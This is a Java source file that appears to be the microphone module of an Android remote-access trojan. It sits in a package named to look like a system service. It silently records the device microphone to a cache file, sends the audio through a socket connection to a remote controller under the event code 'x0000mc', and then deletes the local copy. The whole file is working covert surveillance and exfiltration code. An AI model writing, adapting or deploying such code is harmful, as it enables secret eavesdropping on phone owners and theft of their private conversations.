package com.android.background.services.helpers;

import android.media.MediaRecorder;
import android.util.Log;

import com.android.background.services.IOSocket;
import com.android.background.services.MainService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class MicManager {

    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";

    public static void startRecording() {
        File dir = MainService.getContextOfApplication().getCacheDir();
        try {
            Log.e("MicManager", "Start recording in dir: " + dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "Cannot create temp file for audio", e);
            return;
        }

        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audiofile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            Log.i(TAG, "Recording started...");
        } catch (Exception e) {
            Log.e(TAG, "Error starting recorder", e);
        }
    }

    // ✅ Dừng ghi và gửi file về
    public static void stopRecording() {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
                Log.i(TAG, "Recording stopped.");

                sendVoice(audiofile);
                audiofile.delete(); // cleanup
            } else {
                Log.w(TAG, "Recorder was null when stopping.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping recorder", e);
        }
    }

    // ✅ Gửi file âm thanh về qua socket
    private static void sendVoice(File file) {
        try {
            int size = (int) file.length();
            byte[] data = new byte[size];
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            buf.close();

            JSONObject object = new JSONObject();
            object.put("file", true);
            object.put("name", file.getName());
            object.put("buffer", data);

            IOSocket.getInstance().getIoSocket().emit("x0000mc", object);
            Log.i(TAG, "Audio file sent.");
        } catch (IOException | JSONException e) {
            Log.e(TAG, "Error sending audio", e);
        }
    }
}
